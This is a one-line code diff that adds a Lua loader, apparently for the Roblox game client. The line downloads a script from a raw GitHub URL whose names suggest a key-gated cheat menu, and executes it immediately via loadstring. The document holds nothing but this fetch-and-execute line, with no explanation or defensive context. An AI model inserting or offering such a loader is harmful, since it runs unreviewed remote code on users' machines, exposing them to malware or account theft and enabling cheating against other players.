@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/0qX12/keysytemvalidka/main/bigmacmenu")()
